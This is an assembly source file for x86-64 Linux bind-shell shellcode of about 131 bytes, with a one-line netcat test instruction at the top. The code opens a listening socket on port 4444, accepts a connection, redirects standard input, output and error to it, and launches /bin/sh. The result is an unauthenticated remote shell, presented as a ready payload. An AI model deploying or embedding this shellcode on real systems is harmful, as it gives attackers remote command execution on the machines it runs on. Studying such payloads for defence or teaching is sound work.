
test = after you run the shellcode open another terminal an run 'netcat -vv 0.0.0.0 4444'

;shellcode contains 131 bytes

global _start


section .text

_start:
		
	
	xor rsi,	rsi	;set rsi to zero, since we will push syscall and first param on the stack, and then pop it of we don't need to
				;set rax and rdi to zero

create_socket:
	
	;int socket(int domain, int type, int protocol);
	push 41			;sys_socket
	pop rax
	push 2			;AF_INET
	pop rdi	
	inc rsi			;SOCK_STREAM
	xor rdx,	rdx
	syscall

	;save the return value for future use
	xchg rdi, rax

	
	; sin_zero:        0
	; sin_addr.s_addr: INADDR_ANY = 0
	; sin_port:        4444 
	; sin_family:      AF_INET = 2
	xor rax, rax
	push rax			; sin_zero 
	push rax			; zero out another 8 bytes for remaining members
	mov word [rsp+2], 0x5c11	; sin_port = 4444
	mov byte [rsp], 0x2		; sin_family

bind:
	;int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	xor 	rdx,	rdx	
	push 	49		;sys_bind
	pop 	rax
	push	rsp	
	pop 	rsi		;stack pointer	to sock address
	add	rdx,	16	;sizeof sockaddr
	syscall


listen:
	;int listen(int sockfd, int backlog);
	xor     rsi,	rsi
	push 	50		;sys_listen
	pop 	rax
	inc 	rsi		;backlog = number of clients 
	syscall

	
accept:
	;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	push 	43 		;sys_accept
	pop 	rax
	mov rsi, rsp		; stack pointer for client sockaddr
	mov byte [rsp-1], 0x10	; put size of the structure on the stack
	dec rsp			; adjust stack pointer for previous
	mov rdx, rsp		; stack pointer for struct size
	syscall

	;save client socket 
	xchg r10,	 rax

	
close:
	;int close(int fd);
	push	3		;sys_close
	pop 	rax
	push	rax		;save 3 on the stack for rsi in dup2
	syscall


	xchg    rdi,	r10	;client socket as first parameter for dup2
	pop 	rsi
	
dup2loop:
	
	;int dup2(int oldfd, int newfd);
	push	33		;sys_dup2
	pop	rax
	dec 	rsi		
	syscall
	loopnz  dup2loop	
	


spawn_shell:
	
	;int execve(const char *filename, char *const argv[], char *const envp[]);
	xor eax,	eax
	add al,		59			;sys_execve
	xor rdi,	rdi			;set rdi to zero
	push rdi				;push null on the stack
	mov rdi,	0x68732F2f6e69622F	;/bin//sh in reverse
	push rdi				
	mov rdi,	rsp			;set stack pointer to rdi
	xor rsi,	rsi			;rsi and rdx == 0
	xor rdx,	rdx
	syscall










